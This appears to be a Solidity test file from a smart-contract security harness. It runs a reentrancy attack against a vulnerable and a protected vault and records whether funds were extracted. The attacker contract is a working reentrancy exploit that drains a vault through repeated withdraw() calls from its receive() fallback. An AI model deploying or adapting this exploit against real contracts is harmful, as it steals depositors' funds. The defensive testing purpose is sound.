// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SentinelBase.t.sol";
import "../targets/VaultVulnerable.sol";
import "../targets/VaultProtected.sol";

contract CustomHarnessAttacker {
    address public immutable target;
    address payable public immutable owner;

    constructor(address _target) {
        target = _target;
        owner = payable(msg.sender);
    }

    function attack() external payable {
        (bool deposited, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(deposited, "deposit failed");

        (bool withdrawn, ) = target.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(withdrawn, "withdraw failed");
    }

    receive() external payable {
        if (target.balance >= 1 ether) {
            (bool ok, ) = target.call(
                abi.encodeWithSignature("withdraw()")
            );
            require(ok, "reentrant withdrawal blocked");
        }
    }

    function collect() external {
        require(msg.sender == owner, "not owner");
        owner.transfer(address(this).balance);
    }
}

contract CustomHarnessExampleTest is SentinelBase {
    function test_custom_reentrancy() public {
        string memory variant = getVariant();
        bool protectedVariant =
            keccak256(bytes(variant)) == keccak256(bytes("protected"));

        address target;

        if (protectedVariant) {
            target = address(new VaultProtected());
        } else {
            target = address(new VaultVulnerable());
        }

        // Seed the vault with funds belonging to an honest user.
        vm.deal(honestUser, 10 ether);
        vm.prank(honestUser);

        (bool funded, ) = target.call{value: 10 ether}(
            abi.encodeWithSignature("deposit()")
        );
        require(funded, "vault funding failed");

        // Measure the attacker's balance before and after the attack.
        vm.deal(attacker, 1 ether);
        uint256 balanceBefore = attacker.balance;

        vm.startPrank(attacker);
        CustomHarnessAttacker exploit =
            new CustomHarnessAttacker(target);

        bool succeeded;

        try exploit.attack{value: 1 ether}() {
            exploit.collect();
        } catch {
            // A revert means this particular attack attempt was blocked.
        }

        vm.stopPrank();

        uint256 profitWei = attacker.balance > balanceBefore
            ? attacker.balance - balanceBefore
            : 0;

        succeeded = profitWei > 1 ether;

        emitSentinelResult(
            "custom_reentrancy",
            variant,
            succeeded,
            profitWei,
            succeeded
                ? "reentrancy extracted funds"
                : "attack did not extract net funds"
        );
    }
}
